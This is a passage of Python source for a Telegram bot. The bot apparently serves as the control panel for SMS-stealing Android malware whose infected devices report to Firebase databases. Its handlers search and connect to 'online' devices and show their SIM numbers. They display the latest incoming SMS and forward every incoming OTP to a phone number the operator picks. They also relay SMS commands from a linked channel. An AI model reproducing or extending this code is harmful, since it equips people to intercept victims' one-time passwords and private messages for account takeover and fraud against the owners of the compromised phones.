@bot.message_handler(func=lambda message: message.text in ["/sim", "/changesim", "Change SIM", "CHANGE SIM"])
def sim_command_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if user_id not in user_connected_device:
        safe_send_message(chat_id, "❌ No device is currently connected. Please connect a device from ONLINE first!")
        return
    dev = user_connected_device[user_id]
    client_id = dev["client_id"]
    fb_id = dev.get("fb_id", "1")
    client_data = dev.get("data", {})
    prompt_sim_selection(chat_id, user_id, client_id, fb_id, client_data, is_change=True)

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_channel")
def handle_channel_link(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    
    channel_input = message.text.strip()
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        safe_send_message(chat_id, "❌ BOT CURRENTLY OFF ❌")
        return
    
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    
    user_states.pop(user_id, None)
    
    loading = safe_send_message(chat_id, """
🔄 CONNECTING WITH CHANNEL 
──────────────────────────────
""", track=False)
    
    channel_id, channel_title = join_channel(channel_input)
    
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    if channel_id:
        user_channel_data[user_id] = {"channel_id": channel_id, "channel_title": channel_title}
        save_data()
        safe_send_message(chat_id, f"""
☢️ CONNECTED WITH CHANNEL

WAITING FOR NEW MESSAGE 
IN CHANNEL 📢
""")
    else:
        safe_send_message(chat_id, "❌ Failed to join channel!")

def process_token_cn(user_id, chat_id):
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, "❌ BOT CURRENTLY OFF ❌")
        return
    
    if not check_user_joined(user_id):
        safe_send_message(chat_id, "Please join channel first! ❌")
        return
    
    if user_id not in user_firebase:
        safe_send_message(chat_id, "❌ Please connect Firebase first!")
        return
    
    if user_id in user_token_channel:
        channel_title = user_token_channel[user_id].get("channel_title", "Unknown")
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            build_inline_button("Update Channel", callback_data="update_token_channel", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔄")),
            build_inline_button("Remove Channel", callback_data="remove_token_channel", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌"))
        )
        
        safe_send_message(chat_id, f"""
──────────────────────────────
 📌 TOKEN CHANNEL SET   
──────────────────────────────

📢 Channel: <b>{channel_title}</b>
✅ Status: <b>Active</b>

💡 <i>You can update or remove it</i>
""", reply_markup=keyboard)
        return
    
    user_states[user_id] = "waiting_for_token_channel"
    safe_send_message(chat_id, """──────────────────────────────
 🔑 TOKEN CHANNEL & GROUP SETUP  
──────────────────────────────

📢 <b>Channel ya Group connect karne ke liye:</b>

1️⃣ <b>Sabse aasan:</b> Apne Channel ya Group se koi bhi message yahan <b>Forward</b> kar dein.
2️⃣ Ya fir Channel/Group ka <b>Chat ID</b> bhejein (jaise: <code>-1004431047270</code>)
3️⃣ Ya Public Username bhejein (jaise: <code>@mychannel</code>)

⚠️ <i>Bot ka channel/group me <b>Admin</b> hona zaroori hai!</i>""")

@bot.message_handler(func=lambda message: message.text in ["TOKEN CN", "Token CN", "/token_cn"])
def token_cn_handler(message):
    process_token_cn(message.from_user.id, message.chat.id)

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_token_channel", content_types=['text', 'photo', 'video', 'document', 'audio', 'voice', 'animation'])
def handle_token_channel(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    
    channel_input = message.text or ""
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        safe_send_message(chat_id, "❌ BOT CURRENTLY OFF ❌")
        return
    
    try:
        bot.delete_message(chat_id, message.message_id)
    except Exception:
        pass
    
    user_states.pop(user_id, None)
    loading = safe_send_message(chat_id, "🔄 Connecting to channel/group...", track=False)
    channel_id, channel_title = join_channel(channel_input, message=message)
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except Exception:
            pass
            
    if channel_id:
        user_token_channel[user_id] = {
            "channel_id": channel_id,
            "channel_title": channel_title,
            "token": "TOKEN_CN"
        }
        user_token_active[user_id] = True
        save_data()
        safe_send_message(chat_id, f"""──────────────────────────────
  ✅ TOKEN CHANNEL/GROUP SET ✅  
──────────────────────────────

📢 Title: <b>{channel_title}</b>
🆔 ID: <code>{channel_id}</code>
🔑 Token: <code>TOKEN_CN</code>

✅ <b>Channel/Group is ready!</b>
💡 <i>Any SMS command posted in this channel or group will now be processed.</i>
""")
    else:
        safe_send_message(chat_id, """❌ <b>Connection Failed!</b>

⚠️ <b>Dhyan rakhein:</b>
• Bot aapke Channel ya Group me <b>Admin</b> hona chahiye!
• <b>Sabse aasan:</b> Channel/Group se koi bhi ek message yahan <b>Forward</b> karein.
• Ya fir Chat ID bhejein (jaise: <code>-1004431047270</code>)""")

@bot.callback_query_handler(func=lambda call: call.data == "update_token_channel")
def update_token_channel(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    user_states[user_id] = "waiting_for_token_channel"
    safe_send_message(chat_id, """
🔄 UPDATE TOKEN CHANNEL

📢 PLEASE SEND NEW CHANNEL

📎 Send channel link / ID
""")
    bot.answer_callback_query(call.id, "Update Channel")

@bot.callback_query_handler(func=lambda call: call.data == "remove_token_channel")
def remove_token_channel(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if user_id in user_token_channel:
        channel_title = user_token_channel[user_id].get("channel_title", "Unknown")
        del user_token_channel[user_id]
        user_token_active[user_id] = False
        save_data()
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        safe_send_message(chat_id, f"""
✅ TOKEN CHANNEL REMOVED!

📢 Channel: <b>{channel_title}</b>

🔑 Token: <code>TOKEN_CN</code> - REMOVED
""")
        bot.answer_callback_query(call.id, "Token channel removed successfully")
    else:
        bot.answer_callback_query(call.id, "No Token channel found")

def show_otp_device_forward_status(chat_id, user_id, client_id):
    fwd = device_forward_numbers.get(client_id)
    has_number = fwd is not None and bool(fwd.get("phone"))
    
    model_name = "Device"
    fb_list = user_firebase.get(user_id, {})
    for fb_id, fb_data in fb_list.items():
        try:
            c_data = get_client_by_id(fb_data["db"], client_id)
            if c_data and c_data.get("modelName"):
                model_name = c_data.get("modelName")
                break
        except:
            pass
            
    if has_number:
        phone = fwd.get("phone")
        text = f"""📱 <b>OTP SMS FORWARD STATUS</b>
──────────────────────────────
🆔 <b>Device ID:</b> <code>{client_id}</code>
🪩 <b>Model:</b> {model_name}
📞 <b>Forward To:</b> <code>{phone}</code>
📊 <b>Status:</b> ✅ <b>Active</b>
──────────────────────────────
⚡ <i>Incoming SMS received on ANY SIM of this device will automatically be sent to {phone}!</i>"""
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            build_inline_button("Change Number", callback_data=f"otp_change_num_{client_id}", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔄")),
            build_inline_button("Remove Number", callback_data=f"otp_remove_num_{client_id}", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌"))
        )
        keyboard.add(build_inline_button("Back to Menu", callback_data="menu_refresh", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔄")))
        safe_send_message(chat_id, text, reply_markup=keyboard)
    else:
        text = f"""📱 <b>SET OTP FORWARD NUMBER</b>
──────────────────────────────
🆔 <b>Device ID:</b> <code>{client_id}</code>
🪩 <b>Model:</b> {model_name}
📊 <b>Status:</b> ❌ <b>Not Set</b>
──────────────────────────────
Please enter the <b>Phone Number</b> where incoming SMS/OTP from this device should be forwarded:

<i>Example:</i> <code>+919876543210</code> or <code>9876543210</code>"""
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(build_inline_button("Cancel", callback_data="menu_refresh", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌")))
        user_states[user_id] = {"action": "waiting_for_otp_forward_number", "client_id": client_id}
        safe_send_message(chat_id, text, reply_markup=keyboard)


def process_otp_channel(user_id, chat_id):
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, """
❌ BOT CURRENTLY OFF ❌

PLEASE CONTACT OWNER
         ☠️ @AYUSH_JOD3 ☠️
""")
        return
    
    if not check_user_joined(user_id):
        safe_send_message(chat_id, "Please join channel first! ❌")
        return
    
    if user_id not in user_firebase:
        safe_send_message(chat_id, "❌ Please connect Firebase first!")
        return
    
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    
    if user_id in user_connected_device:
        c_id = user_connected_device[user_id]["client_id"]
        c_model = user_connected_device[user_id].get("data", {}).get("modelName", "Device")
        keyboard.add(build_inline_button(f"Connected: {c_model} ({c_id[:10]}...)", callback_data=f"otp_select_dev_{c_id}", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("📱")))
    
    fb_list = user_firebase.get(user_id, {})
    for fb_id, fb_data in fb_list.items():
        try:
            db = fb_data.get("db")
            if db:
                clients = get_online_clients(db)
                for c in clients[:5]:
                    c_id = c["id"]
                    if user_id in user_connected_device and user_connected_device[user_id]["client_id"] == c_id:
                        continue
                    m_name = c["data"].get("modelName", "Device")
                    keyboard.add(build_inline_button(f"{m_name} ({c_id[:10]}...)", callback_data=f"otp_select_dev_{c_id}", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("📱")))
        except:
            pass
            
    keyboard.add(build_inline_button("Cancel", callback_data="menu_refresh", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌")))
    
    user_states[user_id] = "waiting_for_otp_device_id"
    safe_send_message(chat_id, """📲 <b>OTP FORWARD TO PHONE NUMBER</b>
──────────────────────────────
Forward incoming SMS / OTP from your device to any phone number!

Please enter the <b>Device ID</b> (or select below):
<i>Example:</i> <code>abc123def456</code>""", reply_markup=keyboard)


@bot.message_handler(func=lambda message: message.text in ["OTP CHANNEL", "OTP Channel", "/otp_channel"])
def otp_channel_handler(message):
    process_otp_channel(message.from_user.id, message.chat.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("otp_select_dev_"))
def otp_select_dev_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    update_user_activity(user_id)
    client_id = call.data.replace("otp_select_dev_", "").strip()
    user_states.pop(user_id, None)
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass
    show_otp_device_forward_status(chat_id, user_id, client_id)
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("otp_change_num_"))
def otp_change_num_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    update_user_activity(user_id)
    client_id = call.data.replace("otp_change_num_", "").strip()
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass
    curr_phone = device_forward_numbers.get(client_id, {}).get("phone", "None")
    text = f"""🔄 <b>CHANGE FORWARDING NUMBER</b>
──────────────────────────────
🆔 <b>Device ID:</b> <code>{client_id}</code>
📞 <b>Current Number:</b> <code>{curr_phone}</code>

Please enter the <b>new phone number</b>:
<i>Example:</i> <code>+919876543210</code>"""
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(build_inline_button("Cancel", callback_data="menu_refresh", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌")))
    user_states[user_id] = {"action": "waiting_for_otp_forward_number", "client_id": client_id}
    safe_send_message(chat_id, text, reply_markup=keyboard)
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("otp_remove_num_"))
def otp_remove_num_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    update_user_activity(user_id)
    client_id = call.data.replace("otp_remove_num_", "").strip()
    if client_id in device_forward_numbers:
        device_forward_numbers.pop(client_id, None)
        save_data()
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass
    bot.answer_callback_query(call.id, "Forwarding number removed for this device.", show_alert=True)
    show_otp_device_forward_status(chat_id, user_id, client_id)


@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_otp_device_id")
def handle_otp_device_id_input(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    update_user_activity(user_id)
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        safe_send_message(chat_id, "Bot is currently disabled by admin")
        return
    client_id = message.text.strip()
    user_states.pop(user_id, None)
    try:
        bot.delete_message(chat_id, message.message_id)
    except Exception:
        pass
    show_otp_device_forward_status(chat_id, user_id, client_id)


@bot.message_handler(func=lambda message: isinstance(user_states.get(message.from_user.id), dict) and user_states[message.from_user.id].get("action") == "waiting_for_otp_forward_number")
def handle_otp_forward_number_input(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    update_user_activity(user_id)
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        safe_send_message(chat_id, "Bot is currently disabled by admin")
        return
    state = user_states.pop(user_id, {})
    client_id = state.get("client_id", "")
    phone_raw = message.text.strip()
    try:
        bot.delete_message(chat_id, message.message_id)
    except Exception:
        pass
        
    phone_clean = re.sub(r'[\s\-\(\)]', '', phone_raw)
    if not phone_clean.startswith("+") and len(phone_clean) == 10 and phone_clean.isdigit():
        phone_clean = "+91" + phone_clean
    elif not phone_clean.startswith("+") and phone_clean.isdigit():
        phone_clean = "+" + phone_clean
        
    device_forward_numbers[client_id] = {
        "phone": phone_clean,
        "user_id": user_id,
        "active": True
    }
    save_data()
    
    fb_list = user_firebase.get(user_id, {})
    for fb_id, fb_data in fb_list.items():
        try:
            db = fb_data.get("db")
            if db:
                start_otp_monitoring_for_device_forward(user_id, client_id, db)
        except Exception:
            pass
            
    text = f"""✅ <b>OTP FORWARDING NUMBER CONFIGURED</b>
──────────────────────────────
🆔 <b>Device ID:</b> <code>{client_id}</code>
📞 <b>Forward To:</b> <code>{phone_clean}</code>
📊 <b>Status:</b> ✅ <b>Active</b>
──────────────────────────────
⚡ <i>Incoming SMS received on ANY SIM of this device will automatically be sent to {phone_clean}!</i>"""
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        build_inline_button("Change Number", callback_data=f"otp_change_num_{client_id}", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔄")),
        build_inline_button("Remove Number", callback_data=f"otp_remove_num_{client_id}", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌"))
    )
    keyboard.add(build_inline_button("Main Menu", callback_data="menu_refresh", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔄")))
    safe_send_message(chat_id, text, reply_markup=keyboard)

def process_search(user_id, chat_id):
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, "Bot is currently disabled by admin")
        return
    
    if not check_user_joined(user_id):
        safe_send_message(chat_id, "❌ Join first!")
        return
    
    if user_id not in user_firebase:
        safe_send_message(chat_id, "❌ Please connect Firebase first!")
        return
    
    user_states[user_id] = "waiting_for_search"
    safe_send_message(chat_id, """
🔍 PLEASE SEND CLIENT INFO

deviceId/ModelName

To connect directly
""")

@bot.message_handler(func=lambda message: message.text in ["🔍 SEARCH 🔍", "Search", "SEARCH", "/search"])
def search_handler(message):
    process_search(message.from_user.id, message.chat.id)

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_search")
def handle_search(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    
    search_query = message.text.strip()
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        return
    
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    
    user_states.pop(user_id, None)
    
    loading = safe_send_message(chat_id, """
🔍 CHECKING DEVICE STATUS...

──────────────────────────────
CONNECTION FOUND ✅
Device ID - 🔍 Searching...

Checking available Online?
Please Wait...... ⏳
──────────────────────────────
""", track=False)
    
    found_client = None
    found_fb_id = None
    found_db = None
    
    fb_list = user_firebase.get(user_id, {})
    
    for fb_id, fb_data in fb_list.items():
        try:
            db = fb_data["db"]
            clients = db.child("clients").get()
            
            if clients and clients.each():
                for client in clients.each():
                    client_data = client.val()
                    if client_data and isinstance(client_data, dict):
                        client_id = client.key()
                        model_name = client_data.get("modelName", "")
                        
                        if (search_query.lower() in client_id.lower() or 
                            search_query.lower() in model_name.lower() or
                            search_query == client_id or
                            search_query == model_name):
                            found_client = {"id": client_id, "data": client_data}
                            found_fb_id = fb_id
                            found_db = db
                            break
            if found_client:
                break
        except:
            pass
    
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    if found_client:
        client_id = found_client["id"]
        client_data = found_client["data"]
        
        if not is_client_online(found_db, client_id):
            safe_send_message(chat_id, f"""
⚠️ CONNECTION OFFLINE RIGHT NOW ⚠️

🆔 Device ID: <code>{client_id}</code>

Please try again later!
""")
            return
        
        model_name = client_data.get('modelName', 'Unknown')
        battery = client_data.get('battery', 'N/A')
        sims = extract_sims(client_data)
        
        sim_details = ""
        for sim in sims:
            c_name = sim.get('carrierName', 'Active SIM')
            p_no = sim.get('phoneNumber', '')
            p_str = f"  |  📞 {p_no}" if p_no and p_no != "N/A" else ""
            s_idx = sim.get('simSlotIndex', 0)
            sim_details += f"📶 {c_name}{p_str}  |  🎰 Slot {s_idx}\n"
        
        msg = f"""
🔍 DEVICE FOUND AND ONLINE ✅

🆔 Device ID: <code>{client_id}</code>
🪩 Model: {model_name}
🔋 Battery: {str(battery).rstrip('%')}%

📱 Total Sims: {len(sims)}
{sim_details.rstrip() if sim_details else '⚠️ No SIM found'}

──────────────────────────────
<b>Do you want to connect this device?</b>
"""
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            build_inline_button("Confirm Connect", callback_data=f"searchconnect_{found_fb_id}_{client_id}", style="success", icon_custom_emoji_id=CUSTOM_EMOJIS.get("✅")),
            build_inline_button("Cancel", callback_data="searchcancel", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌"))
        )
        
        safe_send_message(chat_id, msg, reply_markup=keyboard)
    else:
        safe_send_message(chat_id, """
❌ CLIENT NOT FOUND!
""")

@bot.callback_query_handler(func=lambda call: call.data == "searchcancel")
def search_cancel_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    safe_send_message(chat_id, "❌ Connection Cancelled!")
    bot.answer_callback_query(call.id, "Action cancelled")

@bot.callback_query_handler(func=lambda call: call.data.startswith("searchconnect_"))
def search_connect_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    parts = call.data.replace("searchconnect_", "").split("_")
    
    if len(parts) == 2:
        fb_id, client_id = parts
    else:
        client_id = parts[0]
        fb_id = "1"
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        bot.answer_callback_query(call.id, "Bot is currently disabled by admin", show_alert=True)
        return
    
    fb_list = user_firebase.get(user_id, {})
    if not fb_list:
        bot.answer_callback_query(call.id, "Please connect Firebase first", show_alert=True)
        return
    
    fb_data = fb_list.get(fb_id, list(fb_list.values())[0])
    db = fb_data["db"]
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    
    if not is_client_online(db, client_id):
        bot.answer_callback_query(call.id, "Selected device is currently offline", show_alert=True)
        safe_send_message(chat_id, f"""
⚠️ CONNECTION OFFLINE RIGHT NOW ⚠️

🆔 Device ID: <code>{client_id}</code>
""")
        return
    
    connecting = safe_send_message(chat_id, "🔄 CONNECTING...", track=False)
    client_data = get_client_by_id(db, client_id)
    if connecting:
        try:
            bot.delete_message(chat_id, connecting.message_id)
        except:
            pass
    
    if not client_data:
        bot.answer_callback_query(call.id, "Device not found", show_alert=True)
        return

    prompt_sim_selection(chat_id, user_id, client_id, fb_id, client_data, is_change=False)
    bot.answer_callback_query(call.id)

def process_logout(user_id, chat_id):
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, "Bot is currently disabled by admin")
        return
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        build_inline_button("Firebase", callback_data="logout_firebase", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔥")),
        build_inline_button("OTP Forward", callback_data="logout_otp", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("💬")),
        build_inline_button("Token CN", callback_data="logout_token", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("📝"))
    )
    
    safe_send_message(chat_id, """
──────────────────────────────
    ☢️ WHAT YOU WANT  ☢️    
──────────────────────────────

✅ FIREBASE - Logout Firebase
✅ OTP CHANNEL - Logout OTP
✅ TOKEN CN - Logout Token Channel

Click Now button to Continue
""", reply_markup=keyboard)

@bot.message_handler(func=lambda message: message.text in ["LOGOUT", "Logout", "/logout"])
def logout_handler(message):
    process_logout(message.from_user.id, message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "logout_firebase")
def logout_firebase_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    firebase_list = user_firebase.get(user_id, {})
    
    if not firebase_list:
        bot.answer_callback_query(call.id, "No Firebase database connected", show_alert=True)
        return
    
    bot.answer_callback_query(call.id, "Showing Firebase connections")
    
    count = 1
    for fb_id, fb_data in firebase_list.items():
        msg = f"""
FIREBASE - {count}
URL - {fb_data['url']}

Connected date - {fb_data.get('connected_date', 'N/A')}
Connected time - {fb_data.get('connected_time', 'N/A')}

DO YOU WANT Logout This
"""
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(build_inline_button("Confirm Logout", callback_data=f"confirm_logout_fb_{fb_id}", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🗑")))
        safe_send_message(chat_id, msg, reply_markup=keyboard)
        count += 1

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_logout_fb_"))
def confirm_logout_fb(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    fb_id = call.data.replace("confirm_logout_fb_", "")
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if user_id in user_firebase and fb_id in user_firebase[user_id]:
        del user_firebase[user_id][fb_id]
        if user_id in user_firebase_count:
            user_firebase_count[user_id] = len(user_firebase.get(user_id, {}))
        
        if not user_firebase.get(user_id):
            if user_id in user_firebase:
                del user_firebase[user_id]
            user_firebase_count[user_id] = 0
        
        save_data()
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        safe_send_message(chat_id, f"✅ FIREBASE-{fb_id} LOGOUT SUCCESSFUL!")
    else:
        bot.answer_callback_query(call.id, "Firebase database not found", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "logout_otp")
def logout_otp_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if user_id in user_otp_channel:
        del user_otp_channel[user_id]
        if user_id in otp_monitoring:
            del otp_monitoring[user_id]
        if user_id in user_locked_messages:
            del user_locked_messages[user_id]
        save_data()
        bot.answer_callback_query(call.id, "OTP channel logged out successfully", show_alert=True)
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        safe_send_message(chat_id, "✅ OTP CHANNEL SE LOGOUT HO GYE")
    else:
        bot.answer_callback_query(call.id, "No OTP channel connected", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "logout_token")
def logout_token_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if user_id in user_token_channel:
        channel_title = user_token_channel[user_id].get("channel_title", "Unknown")
        del user_token_channel[user_id]
        user_token_active[user_id] = False
        save_data()
        
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        
        safe_send_message(chat_id, f"""
✅ TOKEN CHANNEL LOGOUT!

📢 Channel: <b>{channel_title}</b>

🔑 Token: <code>TOKEN_CN</code> - LOGGED OUT ✅
""")
        bot.answer_callback_query(call.id, "Token channel logged out successfully")
    else:
        bot.answer_callback_query(call.id, "No Token channel connected", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("msg_forward_"))
def msg_forward_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    update_user_activity(user_id)
    client_id = call.data.replace("msg_forward_", "").strip()
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass
    show_otp_device_forward_status(chat_id, user_id, client_id)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("fwd_upd_"))
def fwd_update_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    client_id = call.data.replace("fwd_upd_", "").strip()
    otp_change_num_callback(call)

@bot.callback_query_handler(func=lambda call: call.data.startswith("fwd_rmv_"))
def fwd_remove_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    client_id = call.data.replace("fwd_rmv_", "").strip()
    otp_remove_num_callback(call)


@bot.callback_query_handler(func=lambda call: call.data.startswith("seemgs_"))
def see_messages_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    update_user_activity(user_id)
    client_id = call.data.replace("seemgs_", "").strip()
    show_device_live_messages(chat_id, user_id, client_id, message_id=call.message.message_id)
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: message.text in ["See Msg", "SEE MSG", "See Messages", "/messages", "/seemgs"])
def see_msg_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not check_version_and_notify(user_id, chat_id):
        return
    update_user_activity(user_id)
    if user_id in user_connected_device:
        client_id = user_connected_device[user_id].get("client_id")
        show_device_live_messages(chat_id, user_id, client_id)
    else:
        user_states[user_id] = "waiting_for_see_msg_device_id"
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(build_inline_button("Cancel", callback_data="menu_refresh", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌")))
        safe_send_message(chat_id, """📨 <b>ENTER DEVICE ID TO SEE MESSAGES</b>
──────────────────────────────
Jis device ke live messages dekhne hain, uski Device ID enter karen:""", reply_markup=keyboard)

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_see_msg_device_id")
def handle_see_msg_device_id(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    user_states.pop(user_id, None)
    client_id = message.text.strip()
    try:
        bot.delete_message(chat_id, message.message_id)
    except Exception:
        pass
    show_device_live_messages(chat_id, user_id, client_id)

def show_device_live_messages(chat_id, user_id, client_id, message_id=None):
    fb_list = user_firebase.get(user_id, {})
    if not fb_list:
        safe_send_message(chat_id, "❌ Please connect Firebase first!")
        return
        
    db = list(fb_list.values())[0]["db"]
    for fb_data in fb_list.values():
        c = get_client_by_id(fb_data["db"], client_id)
        if c:
            db = fb_data["db"]
            break
            
    msgs = collect_client_messages(db, client_id)
    
    if not msgs:
        text = f"""📨 <b>DEVICE MESSAGES</b>
──────────────────────────────
🆔 <b>Device ID:</b> <code>{client_id}</code>
📊 <b>Status:</b> No incoming messages found yet.
──────────────────────────────
⚡ <i>Naye messages aate hi yahan live show honge!</i>"""
    else:
        recent = msgs[-5:]
        recent.reverse()
        msg_blocks = []
        for m in recent:
            msg_blocks.append(f"""📞 <b>From:</b> <code>{m['from']}</code>
💬 <code>{m['body']}</code>
🕐 <i>{m['time']}</i>""")
        all_text = "\n──────────────────────────────\n".join(msg_blocks)
